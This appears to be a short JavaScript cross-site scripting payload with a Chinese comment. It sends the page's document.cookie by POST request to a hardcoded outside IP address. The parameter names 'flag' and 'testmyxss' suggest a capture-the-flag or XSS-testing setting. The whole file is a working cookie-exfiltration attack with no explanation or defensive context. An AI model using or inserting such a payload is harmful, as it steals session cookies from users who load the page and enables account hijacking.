let xhrtest = new XMLHttpRequest();
//配置请求方式和请求地址
xhrtest.open("post","http://39.101.137.200:7745/send");
xhrtest.send("header=flag&listener=testmyxss&content="+document.cookie)
